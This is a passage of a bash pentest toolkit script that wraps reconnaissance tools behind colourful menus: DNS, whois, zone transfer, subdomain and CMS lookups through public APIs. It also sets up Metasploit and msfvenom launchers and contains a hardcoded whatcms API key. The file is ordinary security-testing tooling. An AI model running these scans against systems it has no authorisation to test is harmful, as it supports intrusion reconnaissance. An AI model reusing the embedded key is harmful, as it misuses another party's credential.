#!/usr/bin/env bash
#    This file is part of BINTLABS Research 
#    Copyright (CC BY-SA 4.0) 2019 @briskinfosec
#    BPT(Briskinfosec Pentest Toolkit) - Automated Penetest Toolkit.



#This colour
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
BlueF='\e[1;34m'
Magenta='\e[35m' 
bold='\e[1m'
blink='\e[5m'
nr='\e[25m'
lightyellow='\e[93m'

#Variable
Version='1.0'
Codename='Brisk-infosec'
xtermnmap='xterm -hold -fa monaco -fs 13 -bg black -e nmap'
xtermeta='xterm -hold -fa monaco -fs 13 -bg black -e msfconsole'
xtermpay='xterm -hold -fa monaco -fs 13 -bg black -e msfvenom'
xtermcurl='xterm -hold -fa monaco -fs 13 -bg black -e curl'
xtermopen='xterm -hold -fa monaco -fs 13 -bg black -e openssl'
ip=$(ip addr show wlan0 | awk '/inet / {print $2}' | cut -d/ -f 1)


function myip() {
echo
touch myinfo && echo "" > myinfo
curl "ifconfig.me/all" -s  > myinfo
my_ip=$(grep -o 'ip_addr:.*' myinfo | cut -d " " -f2)
ip=$(ip addr show wlan0 | awk '/inet / {print $2}' | cut -d/ -f 1)
#remote_ip=$(grep -o 'remote_host:.*' myinfo | cut -d " " -f2)
echo 
printf "\e[1;92m[*] My Remote IP:\e[0m\e[1;77m %s\e[0m\n" $my_ip
echo 
printf "\e[1;92m[*] My Local IP:\e[0m\e[1;77m %s\e[0m\n" $ip
rm -rf myinfo

}

#tools path
testssl_path='tools/testssl.sh/'
owaspnett='tools/OWASP-Nettacker/'

#ctrl+c
trap ctrl_c INT

function ctrl_c() {
clear
banner
echo
echo 
echo -e $yellow"[*] (Ctrl + C ) Detected, Trying To Exit ..."
sleep 1
echo ""
echo -e $yellow"[*] Thank You For Using Our Tool  =)."
echo ""
exit
}



#rootuser
if [[ $EUID -ne 0 ]]; then
	echo "ERROR! Run this script with root user!"
	exit 1
fi

############# Checking Dependecies ######################
clear
echo
echo -e $okegreen " .----------------.        .----------------.       .----------------.   "
echo -e $okegreen "| .--------------. |      | .--------------. |     | .--------------. |  "
echo -e $okegreen "| |   ______     | |      | |   ______     | |     | |  _________   | |  "
echo -e $okegreen "| |  |_   _ \    | |      | |  |_   __ \   | |     | | |  _   _  |  | |  "
echo -e $okegreen "| |    | |_) |   | |      | |    | |__) |  | |     | | |_/ | | \_|  | |  "
echo -e $okegreen "| |    |  __'.   | |      | |    |  ___/   | |     | |     | |      | |  "
echo -e $okegreen "| |   _| |__) |  | |      | |   _| |_      | |     | |    _| |_     | |  "
echo -e $okegreen "| |  |_______/   | |      | |  |_____|     | |     | |   |_____|    | |  "  
echo -e $okegreen "| |              | |      | |              | |     | |              | |  "
echo -e $okegreen "| '--------------' |      | '--------------' |     | '--------------' |  "
echo -e $okegreen " '----------------'        '----------------'       '----------------'   "
echo -e $white"BRISKINFOSEC PENTEST TOOLKIT - BPT (VERSION 1.0)  WWW.BRISKINFOSEC.COM        "$okegreen $bold
echo 
if [ $(id -u) != "0" ]; then

      echo [!]::[Check Dependencies] ;
      sleep 2
      echo [✔]::[Check User]: $USER ;
      sleep 1
      echo [x]::[not root]: you need to be [root] to run this script.;
      echo ""
   	  sleep 1
	  exit


else

   echo [!]::[Check Dependencies]: ;
   sleep 1
   echo [✔]::[Check User]: $USER ;

fi

  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then

    echo [✔]::[Internet Connection]: DONE!;
    echo [x]::[warning]: This Script Needs An Active Internet Connection;
    sleep 2

else

    echo [✔]::[Internet Connection]: connected!;
    sleep 2
fi

# check nmap if exists
      which nmap > /dev/null 2>&1
      if [ "$?" -eq "0" ]; then
      echo [✔]::[nmap]: installation found!;
else

   echo [x]::[warning]:this script require Nmap ;
   echo ""
   echo [!]::[please wait]: please install .... ;
   apt-get update
   apt-get install nmap
   echo ""
   sleep 2
   exit
fi
sleep 2
#check metasploit if exists
      which msfconsole > /dev/null 2>&1
      if [ "$?" -eq "0" ]; then
      echo [✔]::[metasploit-framework]: installation found!;
else

   echo [x]::[warning]:this script require Metasploit ;
   echo ""
   echo [!]::[please wait]: please install .... ;
   apt-get update
   apt-get install metasploit-framework
   echo ""
   sleep 2
   exit
fi
# check urxvt if exists
      which xterm > /dev/null 2>&1
      if [ "$?" -eq "0" ]; then
      echo [✔]::[xterm]: installation found!;
else

   echo [x]::[warning]:this script require xterm ;
   echo ""
   echo [!]::[please wait]: please install .... ;
   apt-get update
   apt-get install xterm
   echo ""
   sleep 2
   exit
fi
sleep 2


#######################################################
# INTELLIGENCE GATHERING
#######################################################
function intel() {
clear
echo ""
banner
echo
echo -e "  $yellow [INTEL GATHERING]  $red  NETWORK SCANNING    EXPLOITATION TECH    SSL INFO        "
echo
echo
echo -e $okegreen" ====================================================================="
echo -e $cyan    "                      INTELLIGENCE GATHERING                    "
echo -e $okegreen" ====================================================================="                                                                
echo ""
echo ""
          echo -e $white"	[$okegreen"1"$white]$cyan $bold WEB INFORMATION GATHERING "
echo
	  echo -e $white"	[$okegreen"2"$white]$cyan $bold NETWORK INFORMATION GATHERING"
echo

	  #echo -e $white"	[$okegreen"3"$white]$cyan $bold WEB INFORMATIONS"
	  echo -e $white"	[$okegreen"3"$white]$cyan $bold BACK"
	    
	  echo -e
echo -e 
myip
echo -e 
echo -e
          echo -n -e $red'  \033[4mBriskInfosec@Sec:\033[0m>> '; tput sgr0 #insert your choice
          read intelga	
		if test $intelga == '1'
		then 
		webinfo
		elif test $intelga == '2'
                then
  		netinfo	
                elif test $intelga == '3'
                then
                menu
        else
            echo ""
            echo -e $okegreen " Incorrect Number"
          fi
          echo ""
          echo ""
          echo -n -e $red " Back to Last Menu? ( Yes / No ) :"
        read back
        if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
            then
            clear
            intel
        elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
            then
            menu
        
fi
                       
 
 }

#######################################################
# network information
#######################################################
function webinfo() {
clear
echo ""
banner
echo
echo -e "  $yellow [INTEL GATHERING]  $red  NETWORK SCANNING    EXPLOITAION TECH    SSL INFO        "
echo
echo -e $okegreen" ====================================================================="
echo -e $cyan    "                     WEB INFORMATION GATHERING                    "
echo -e $okegreen" ====================================================================="
echo
echo ""
      echo -e $white"	[$okegreen"1"$white]$cyan $bold TRACE ROUTE"
echo
	  echo -e $white"	[$okegreen"2"$white]$cyan $bold PING SCAN"
echo
	  echo -e $white"	[$okegreen"3"$white]$cyan $bold CHECK WEBSITE IS UP OR DOWN"
echo
	  echo -e $white"	[$okegreen"4"$white]$cyan $bold CHECK EMAIL ADDRESS (VALID OR INVALID)"
echo
	  echo -e $white"	[$okegreen"5"$white]$cyan $bold CMS CHECKER"
echo
	  echo -e $white"	[$okegreen"6"$white]$cyan $bold SUBDOMAIN FINDER"
echo
	  echo -e $white"	[$okegreen"7"$white]$cyan $bold CLOUDFARE DETECTION"
echo
	  echo -e $white"	[$okegreen"8"$white]$cyan $bold FIND BACKEND WEB TECHNOLOGIES"
echo
	  echo -e $white"	[$okegreen"9"$white]$cyan $bold COMPLETE SCAN"
echo
	  echo -e $white"	[$okegreen"10"$white]$cyan $bold BACK"   
	  echo -e
	  echo -e
myip
	  echo -e

          echo -n -e $red'  \033[4mBriskInfosec@Sec:\033[0m>> '; tput sgr0 #insert your choice
          read netgather	
		if test $netgather == '1'
		then 
		echo
		echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
 		read ip
		$xtermcurl https://api.hackertarget.com/mtr/?q=$ip
		elif test $netgather == '2'
                then
  		echo
		echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
 		read ip
		$xtermcurl  https://api.hackertarget.com/nping/?q=$ip
		elif test $netgather == '3'
                then 
		webdwn
		elif test $netgather == '4'
                then 
		mailchecker
		elif test $netgather == '5'
                then 
		cmschecker
		elif test $netgather == '6'
                then 
		subdomain
		elif test $netgather == '7'
                then 
		cloudfare
		elif test $netgather == '8'
                then 
		echo
		echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
 		read ip
		xterm -hold -fa monaco -fs 13 -bg black -e webtech -u $ip
		elif test $netgather == '9'
                then 
		completeweb
		elif test $netgather == '10'
                then
       		intel	
        else
            echo ""
            echo -e $okegreen " Incorrect Number"
          fi
          echo ""
          echo ""
          echo -n -e $red " Back to Last Menu? ( Yes / No ) :"
        read back
        if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
            then
            clear
            webinfo
        elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
            then
            intel
        
fi
                       
 
 }

#######################################################
# completeweb scan intel
#######################################################
function completeweb(){
clear
echo -e $okegreen"   __________  __  _______  __    __________________   _____ _________    _   __  "
echo -e $okegreen"  / ____/ __ \/  |/  / __ \/ /   / ____/_  __/ ____/  / ___// ____/   |  / | / /  "
echo -e $okegreen" / /   / / / / /|_/ / /_/ / /   / __/   / / / __/     \__ \/ /   / /| | /  |/ /   "
echo -e $okegreen"/ /___/ /_/ / /  / / ____/ /___/ /___  / / / /___    ___/ / /___/ ___ |/ /|  /    "
echo -e $okegreen"\____/\____/_/  /_/_/   /_____/_____/ /_/ /_____/   /____/\____/_/  |_/_/ |_/     "
echo
echo
echo -n -e $red $bold " Enter Your Domain or Host name"
echo
echo
echo 
echo -n -e $red'  \033[4mBriskInfosec@Sec:\033[0m>> '; tput sgr0 #insert your choice
          read compweb

echo
echo -e $yellow "####################################################### "
echo -e $yellow "#                TRACE ROUTE                          # "
echo -e $yellow "####################################################### " $white
echo

		curl https://api.hackertarget.com/mtr/?q=$compweb

echo
sleep 1
echo -e  $yellow "####################################################### "
echo -e  $yellow "#                  PING SCAN                          # "
echo -e  $yellow "####################################################### " $white
echo

               curl https://api.hackertarget.com/nping/?q=$compweb
echo
sleep 1
echo -e  $yellow "####################################################### "
echo -e  $yellow "#                  WEB TECHNOLOGIES                   # "
echo -e  $yellow "####################################################### " $white
echo
echo -e -n $okegreen 'Enter http or https:' ; tput sgr0 #insert your choice
	read dom
               webtech -u $dom://$compweb
echo
sleep 1
echo -e  $yellow "####################################################### "
echo -e  $yellow "#             CHECK WEBSITE IS UP OR DOWN             # "
echo -e  $yellow "####################################################### " $white
 
echo
echo
echo -e $red" _       ____________     ________  ________________ __  "$white
echo -e $red"| |     / / ____/ __ )   / ____/ / / / ____/ ____/ //_/  "$white
echo -e $red"| | /| / / __/ / __  |  / /   / /_/ / __/ / /   / ,<     "$white
echo -e $red"| |/ |/ / /___/ /_/ /  / /___/ __  / /___/ /___/ /| |    "$white
echo -e $red"|__/|__/_____/_____/   \____/_/ /_/_____/\____/_/ |_|    "$white
                                                       
echo 
echo
checktango=$(curl -sLi --user-agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31' $compweb | grep -o 'HTTP/1.1 200 OK\|HTTP/2 200')

	if [[ $checktango == *'HTTP/1.1 200 OK'* ]] || [[ $checktango == *'HTTP/2 200'* ]]; then
echo
		echo -e -n  $blink $lightgreen "[*] Site is Up!" $nr $white
	else
echo
		echo -e -n  $blink $red "[*] Site is Down!" $nr $white
	fi
sleep 1

echo 
echo
echo -e  $yellow "####################################################### "
echo -e  $yellow "#                   CMS CHECKER                       # "
echo -e  $yellow "####################################################### " $white
echo 
echo
echo -e $lightgreen"   ________  ________    ________  ________________ __ __________   "$white
echo -e $lightgreen"  / ____/  |/  / ___/   / ____/ / / / ____/ ____/ //_// ____/ __ \  "$white
echo -e $lightgreen" / /   / /|_/ /\__ \   / /   / /_/ / __/ / /   / ,<  / __/ / /_/ /  "$white
echo -e $lightgreen"/ /___/ /  / /___/ /  / /___/ __  / /___/ /___/ /| |/ /___/ _, _/   "$white
echo -e $lightgreen"\____/_/  /_//____/   \____/_/ /_/_____/\____/_/ |_/_____/_/ |_|    "$white
echo

checkcms=$(curl -L -s "https://whatcms.org/APIEndpoint?key=759cba81d90c6188ec5f7d2e2bf8568501a748d752fd2acdba45ee361181f58d07df7d&url=$compweb" > checkcms.log)
detected=$(grep -o 'Success' checkcms.log)

if [[ $detected == *'Success'* ]]; then
cms=$(grep -o '"name":.*,' checkcms.log | cut -d "," -f1 | cut -d ":" -f2 | tr -d '\"')
echo 
echo -e -n $bold $lightgreen "[*] CMS$blink Found $nr:"  $cms 
fi 

many_requests=$(grep -o 'Too Many Requests' checkcms.log)
if [[ $failed = *'Too Many Requests'* ]]; then
echo 
echo -e -n $yellow "[!] Too Many Requests, try later." 
fi


failed=$(grep -o 'Failed: CMS or Host Not Found' checkcms.log)
if [[ $failed = *'Failed: CMS or Host Not Found'* ]]; then
echo
echo -e -n   "[!] Failed: CMS or Host$blink $red Not Found $nr $white"
fi
if [[ -e checkcms.log ]]; then
rm -rf checkcms.log
fi
echo
echo
echo -e  $yellow "####################################################### "
echo -e  $yellow "#                   SUBDOMAIN FINDER                  # "
echo -e  $yellow "####################################################### " $white
echo
echo
echo -e $lightgreen"   _____ __  ______  ____  ____  __  ______    _____   __   ___________   ______  __________   "
echo -e $lightgreen"  / ___// / / / __ )/ __ \/ __ \/  |/  /   |  /  _/ | / /  / ____/  _/ | / / __ \/ ____/ __ \  "
echo -e $lightgreen"  \__ \/ / / / __  / / / / / / / /|_/ / /| |  / //  |/ /  / /_   / //  |/ / / / / __/ / /_/ /  "
echo -e $lightgreen" ___/ / /_/ / /_/ / /_/ / /_/ / /  / / ___ |_/ // /|  /  / __/ _/ // /|  / /_/ / /___/ _, _/   "
echo -e $lightgreen"/____/\____/_____/_____/\____/_/  /_/_/  |_/___/_/ |_/  /_/   /___/_/ |_/_____/_____/_/ |_|    "$white

echo
echo

checksubdomain=$(curl -L -s "https://www.pagesinventory.com/search/?s=$compweb" > infodomain.log)
IFS=$'\n'
checksite=$(grep -o -P "domain/.{0,40}.$subdomainsite.html" infodomain.log | cut -d "." -f1 | cut -d "/" -f2)

if [[ $checksite != "" ]]; then
IFS=$'\n'
echo 
printf "\e[1;92m[*] Subdomain found:\e[0m\n"
echo
printf "\e[1;77m%s\e[0m\n" $checksite
fi

if [[ -e infodomain.log ]]; then
rm -rf infodomain.log
fi

sleep 1
echo
echo -e  $yellow "####################################################### "
echo -e  $yellow "#                CLOUDFARE DETECTION                  # "
echo -e  $yellow "####################################################### "
echo
echo
echo -e $red" _       _____    ______   ____  ______________________________   "
echo -e $red"| |     / /   |  / ____/  / __ \/ ____/_  __/ ____/ ____/_  __/   "
echo -e $red"| | /| / / /| | / /_     / / / / __/   / / / __/ / /     / /      "
echo -e $red"| |/ |/ / ___ |/ __/    / /_/ / /___  / / / /___/ /___  / /       " 
echo -e $red"|__/|__/_/  |_/_/      /_____/_____/ /_/ /_____/\____/ /_/        "$white
echo
echo
	dns="http://api.hackertarget.com/dnslookup/?q=$compweb"
			curl --silent "$dns"
			echo
			if [[ "$dns" == *cloudflare* ]]; then
				echo -e -n $okegreen $blink 'Cloudflare detected' $nr
			else
				echo -e -n $red $blink "$target is *not* protected by Cloudflare" $nr
fi

}


#######################################################
# cloudfare detect
#######################################################
 function cloudfare() {
	 clear
	 echo
	 banner
echo
echo
	 echo -e -n $yellow $bold"  Enter Domain Name    "
	 echo
	 echo
   echo -n -e $red'  \033[4mBriskInfosec@Sec:\033[0m>> '; tput sgr0
    read  target
			dns="http://api.hackertarget.com/dnslookup/?q=$target"
			curl --silent "$dns"
			echo
			if [[ "$dns" == *cloudflare* ]]; then
				echo -e -n $okegreen $blink 'Cloudflare detected' $nr
			else
				echo -e -n $red $blink "$target is *not* protected by Cloudflare" $nr
fi

 }

#######################################################
# website checker
#######################################################
function webdwn(){
clear
echo
banner
                                                       
echo 
echo 
	 echo -e -n $yellow "  Enter Domain Name "
	 echo
	 echo
 	echo -n -e $red'  \033[4mBriskInfosec@Sec:\033[0m>> '; tput sgr0
	read ip_check

checktango=$(curl -sLi --user-agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31' $ip_check | grep -o 'HTTP/1.1 200 OK\|HTTP/2 200')

	if [[ $checktango == *'HTTP/1.1 200 OK'* ]] || [[ $checktango == *'HTTP/2 200'* ]]; then
echo
		echo -e -n  $blink $lightgreen "[*] Site is Up!" $nr $white
	else
echo
		echo -e -n  $blink $red "[*] Site is Down!" $nr $white
	fi
}

#######################################################
# email checker
#######################################################

function mailchecker() {
clear
echo
banner
echo
echo
echo -n -e $yellow $bold "Enter Your Email ID to check"$white
echo  
echo -n -e $red'  \033[4mBriskInfosec@Sec:\033[0m>> '; tput sgr0
read email

checkmail=$(curl -s https://api.2ip.me/email.txt?email=$email | grep -o 'true\|false')

if [[ $checkmail == 'true' ]]; then
echo
echo -e -n $bold $lightgreen $blink "[*] Valid e-mail!" $nr
elif [[ $checkmail == 'false' ]]; then
echo
echo -e -n $bold $red $blink "[!] Invalid e-mail!" $nr
fi
}

#######################################################
# email checker
#######################################################

function cmschecker(){
clear
echo
banner
echo
echo
echo -n -e $yellow $bold "Enter a Website to check"$white
echo  
echo 
echo -n -e $red'  \033[4mBriskInfosec@Sec:\033[0m>> '; tput sgr0
read urlcms

checkcms=$(curl -L -s "https://whatcms.org/APIEndpoint?key=759cba81d90c6188ec5f7d2e2bf8568501a748d752fd2acdba45ee361181f58d07df7d&url=$urlcms" > checkcms.log)
detected=$(grep -o 'Success' checkcms.log)

if [[ $detected == *'Success'* ]]; then
cms=$(grep -o '"name":.*,' checkcms.log | cut -d "," -f1 | cut -d ":" -f2 | tr -d '\"')
echo 
echo -e -n $bold $lightgreen "[*] CMS$blink Found $nr:"  $cms 
fi 

many_requests=$(grep -o 'Too Many Requests' checkcms.log)
if [[ $failed = *'Too Many Requests'* ]]; then
echo 
echo -e -n $yellow "[!] Too Many Requests, try later." 
fi


failed=$(grep -o 'Failed: CMS or Host Not Found' checkcms.log)
if [[ $failed = *'Failed: CMS or Host Not Found'* ]]; then
echo
echo -e -n   "[!] Failed: CMS or Host$blink $red Not Found $nr $white"
fi
if [[ -e checkcms.log ]]; then
rm -rf checkcms.log
fi
}
 

#######################################################
# subdomain checker
#######################################################
function subdomain() {
clear
echo 
banner
echo 
echo
echo -n -e $yellow $bold "Enter a domain name to find subdomains"$white
echo  
echo 
echo -n -e $red'  \033[4mBriskInfosec@Sec:\033[0m>> '; tput sgr0
read subdomainsite

checksubdomain=$(curl -L -s "https://www.pagesinventory.com/search/?s=$subdomainsite" > infodomain.log)
IFS=$'\n'
checksite=$(grep -o -P "domain/.{0,40}.$subdomainsite.html" infodomain.log | cut -d "." -f1 | cut -d "/" -f2)

if [[ $checksite != "" ]]; then
IFS=$'\n'
echo 
printf "\e[1;92m[*] Subdomain found:\e[0m\n"
echo
printf "\e[1;77m%s\e[0m\n" $checksite
fi

if [[ -e infodomain.log ]]; then
rm -rf infodomain.log
fi
}




#######################################################
# NETWORK INFORMATION GATHERING
#######################################################
function netinfo() {
clear
banner
echo
echo -e "  $yellow [INTEL GATHERING]  $red  NETWORK SCANNING    EXPLOITAION TECH    SSL INFO        "
echo ""
echo -e $okegreen" ====================================================================="
echo -e $cyan    "                  NETWORK INFORMATION GATHERING                     "
echo -e $okegreen" ====================================================================="
echo ""
echo ""
           	echo -e $white"	[$okegreen"1"$white]$cyan $bold DNS LOOKUP"
echo
  		echo -e $white"	[$okegreen"2"$white]$cyan $bold REVERSE DNS"
echo
 		echo -e $white"	[$okegreen"3"$white]$cyan $bold HOST RECORDS GATHERING"
echo
  		echo -e $white"	[$okegreen"4"$white]$cyan $bold SHARED DNS SERVER GATHERING"
echo
  		echo -e $white"	[$okegreen"5"$white]$cyan $bold ZONE TRANSFER"
echo
  		echo -e $white"	[$okegreen"6"$white]$cyan $bold WHOIS LOOKUP"
echo
  		echo -e $white"	[$okegreen"7"$white]$cyan $bold DNS LEAK TEST"
echo
		echo -e $white"	[$okegreen"8"$white]$cyan $bold SERVER INFO"
echo
		echo -e $white"	[$okegreen"9"$white]$cyan $bold COMPLETE SCAN"
echo
  		echo -e $white"	[$okegreen"10"$white]$cyan $bold BACK  "
	    
	  	echo -e
        	  echo -n -e $red'  \033[4mBriskInfosec@Sec:\033[0m>> '; tput sgr0 #insert your choice
         		 read dnsq	
			if test $dnsq == '1'
				then
				echo
				echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
 				read ip
				sleep 3
				echo  
				curl  https://api.hackertarget.com/dnslookup/?q=$ip
			elif test $dnsq == '2'
				then
				echo
				echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
 				read ip
				$xtermcurl  https://api.hackertarget.com/reversedns/?q=$ip
			elif test $dnsq == '3'
				then
				echo
				echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
 				read ip
				$xtermcurl  https://api.hackertarget.com/hostsearch/?q=$ip
			elif test $dnsq == '4'
				then
				echo
				echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
 				read ip
				$xtermcurl  https://api.hackertarget.com/findshareddns/?q=$ip
			elif test $dnsq == '5'
				then
				echo
				echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
 				read ip
				$xtermcurl  https://api.hackertarget.com/zonetransfer/?q=$ip
			elif test $dnsq == '6'
				then
				echo
				echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
 				read ip
				$xtermcurl  https://api.hackertarget.com/whois/?q=$ip
			elif test $dnsq == '7'
				then
				checkdns
			elif test $dnsq == '8'
				then
				serverinfo
			elif test $dnsq == '9'
				then
				compnet
			elif test $dnsq == '10'
                	then
       			intel	
        else
            echo ""
            echo -e $okegreen " Incorrect Number"
          fi
          echo ""
          echo ""
          echo -n -e $red " Back to Last Menu? ( Yes / No ) :"
        read back
        if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
            then
            clear
            netinfo
        elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
            then
            intel
        
fi
                       
 
 }

#######################################################
# complete scan network intel
#######################################################
function compnet(){
clear
echo
echo -e $okegreen"   __________  __  _______  __    __________________   _____ _________    _   __  "
echo -e $okegreen"  / ____/ __ \/  |/  / __ \/ /   / ____/_  __/ ____/  / ___// ____/   |  / | / /  "
echo -e $okegreen" / /   / / / / /|_/ / /_/ / /   / __/   / / / __/     \__ \/ /   / /| | /  |/ /   "
echo -e $okegreen"/ /___/ /_/ / /  / / ____/ /___/ /___  / / / /___    ___/ / /___/ ___ |/ /|  /    "
echo -e $okegreen"\____/\____/_/  /_/_/   /_____/_____/ /_/ /_____/   /____/\____/_/  |_/_/ |_/     "
echo
echo
echo -n -e $red'  \033[4mBriskInfosec@Sec:\033[0m>> '; tput sgr0 #insert your choice
         read compnetw
echo
echo -e  $yellow "####################################################### "
echo -e  $yellow "#                   DNS LOOKUP                        # "
echo -e  $yellow "####################################################### " $white
echo
echo
	curl  https://api.hackertarget.com/dnslookup/?q=$compnetw
echo
echo
echo -e  $yellow "####################################################### "
echo -e  $yellow "#                   REVERSE DNS                       # "
echo -e  $yellow "####################################################### " $white
echo
echo
	curl https://api.hackertarget.com/reversedns/?q=$compnetw
echo
echo
echo -e  $yellow "####################################################### "
echo -e  $yellow "#             HOST RECORDS GATHERING                  # "
echo -e  $yellow "####################################################### " $white
echo
echo
	curl https://api.hackertarget.com/hostsearch/?q=$compnetw
echo
echo
echo -e  $yellow "####################################################### "
echo -e  $yellow "#           SHARED DNS SERVER GATHERING               # "
echo -e  $yellow "####################################################### " $white
echo
echo
    	curl https://api.hackertarget.com/findshareddns/?q=$compnetw
echo
echo
echo -e  $yellow "####################################################### "
echo -e  $yellow "#                    ZONE TRANSFER                    # "
echo -e  $yellow "####################################################### " $white
echo
echo
	curl https://api.hackertarget.com/zonetransfer/?q=$compnetw
echo
echo
echo -e  $yellow "####################################################### "
echo -e  $yellow "#                    WHOIS LOOKUP                     # "
echo -e  $yellow "####################################################### " $white
echo
echo
	curl https://api.hackertarget.com/whois/?q=$compnetw
echo
echo
echo -e  $yellow "####################################################### "
echo -e  $yellow "#                   DNS LEAK TEST                     # "
echo -e  $yellow "####################################################### " $white
echo
echo
echo -e "    ____  _   _______    __    _________    __ __    _______________________  "
echo -e "   / __ \/ | / / ___/   / /   / ____/   |  / //_/   /_  __/ ____/ ___/_  __/  "
echo -e "  / / / /  |/ /\__ \   / /   / __/ / /| | / ,<       / / / __/  \__ \ / /     "
echo -e " / /_/ / /|  /___/ /  / /___/ /___/ ___ |/ /| |     / / / /___ ___/ // /      "
echo -e "/_____/_/ |_//____/  /_____/_____/_/  |_/_/ |_|    /_/ /_____//____//_/       "
echo 
echo
echo -e "CHECK WHETHER YOUR DNS LEAKS ANY RECORDS"
echo 
IFS=$'\n'
printf "\n"
printf "\e[1;92m[*] Executing DNS Leak test \e[0m\e[1;77m[1/3]...\e[0m\n"
dns1=$(nslookup whoami.akamai.net | grep -o 'Address:.*' | sed -n '2,2p' | cut -d " " -f2)
checkdns1=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$dns1" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > checkdns1 )
citydns1=$( grep -o "City Location:.*" checkdns1 | cut -d "<" -f3 | cut -d ">" -f2)
countrydns1=$(grep -o 'Country:.*'  checkdns1 | cut -d ">" -f3 | cut -d "&" -f1)
sleep 10
printf "\e[1;92m[*] Executing DNS Leak test \e[0m\e[1;77m[2/3]...\e[0m\n"
dns2=$(nslookup whoami.akamai.net | grep -o 'Address:.*' | sed -n '2,2p' | cut -d " " -f2)
checkdns2=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$dns2" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > checkdns2)
citydns2=$( grep -o "City Location:.*" checkdns2 | cut -d "<" -f3 | cut -d ">" -f2)
countrydns2=$(grep -o 'Country:.*' checkdns2 | cut -d ">" -f3 | cut -d "&" -f1)
sleep 10
printf "\e[1;92m[*] Executing DNS Leak test \e[0m\e[1;77m[3/3]...\e[0m\n"
dns3=$(nslookup whoami.akamai.net | grep -o 'Address:.*' | sed -n '2,2p' | cut -d " " -f2)
checkdns3=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$dns3" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > checkdns3)
citydns3=$( grep -o "City Location:.*" checkdns3 | cut -d "<" -f3 | cut -d ">" -f2)
countrydns3=$(grep -o 'Country:.*' checkdns3 | cut -d ">" -f3 | cut -d "&" -f1)

printf "\n\e[1;93m[*] Results:\e[0m\n"
printf "\n"
printf "\e[1;92mTest 1:\e[0m\e[1;77m %s, \e[1;92mCountry:\e[0m\e[1;77m %s,\e[0m\e[1;92m City:\e[0m\e[1;77m %s\e[0m\n" $dns1 $countrydns1 $citydns1
printf "\e[1;92mTest 2:\e[0m\e[1;77m %s, \e[1;92mCountry:\e[0m\e[1;77m %s,\e[0m\e[1;92m City:\e[0m\e[1;77m %s\e[0m\n" $dns2 $countrydns2 $citydns2
printf "\e[1;92mTest 3:\e[0m\e[1;77m %s, \e[1;92mCountry:\e[0m\e[1;77m %s,\e[0m\e[1;92m City:\e[0m\e[1;77m %s\e[0m\n" $dns3 $countrydns3 $citydns3
printf "\n"
printf "\e[1;93m[*] If you see your city your DNS is leaking\e[0m\n"
printf "\e[1;92m[*] Perform this test more than 1 time for best result\e[0m\n"
if [[ -e checkdns1 ]]; then
rm -rf checkdns1
fi
if [[ -e checkdns2 ]]; then
rm -rf checkdns2
fi
if [[ -e checkdns3 ]]; then
rm -rf checkdns3
fi

echo
echo
echo -e  $yellow "####################################################### "
echo -e  $yellow "#                   SERVER INFO                       # "
echo -e  $yellow "####################################################### " $white
echo
echo
echo 
echo -e $yellow"   _____ __________ _    ____________     _____   ____________   "
echo -e $yellow"  / ___// ____/ __ \ |  / / ____/ __ \   /  _/ | / / ____/ __ \  "
echo -e $yellow"  \__ \/ __/ / /_/ / | / / __/ / /_/ /   / //  |/ / /_  / / / /  "
echo -e $yellow" ___/ / /___/ _, _/| |/ / /___/ _, _/  _/ // /|  / __/ / /_/ /   "
echo -e $yellow"/____/_____/_/ |_| |___/_____/_/ |_|  /___/_/ |_/_/    \____/    "
echo 
echo 
if [[ -e serverinfo ]]; then
rm -rf serverinfo
fi
echo 
echo
curl -s "myip.ms/$compnetw" -L > serverinfo
##
IFS=$'\n'
ip_location=$(grep 'IP Location:' serverinfo | grep -o "'cflag .*\'" | cut -d "I" -f1 | cut -d '>' -f1 | tr -d "\'" | cut -d " " -f2)

if [[ $ip_location != "" ]]; then
echo
printf "\e[1;92m[*] IP Location:\e[0m\e[1;77m %s\e[0m\n" $ip_location
fi
##

ip_range=$(grep -o 'IP Range .*' serverinfo | head -n1 | cut -d "<" -f2 | cut -d ">" -f2)

if [[ $ip_range != "" ]]; then
echo
printf "\e[1;92m[*] IP Range:\e[0m\e[1;77m %s\e[0m\n" $ip_range
fi

##
ip_reversedns=$(grep 'IP Reverse DNS' serverinfo | grep 'sval' | head -n1 | cut -d ">" -f6 | cut -d "<" -f1)

if [[ $ip_reversedns != "" ]]; then
echo
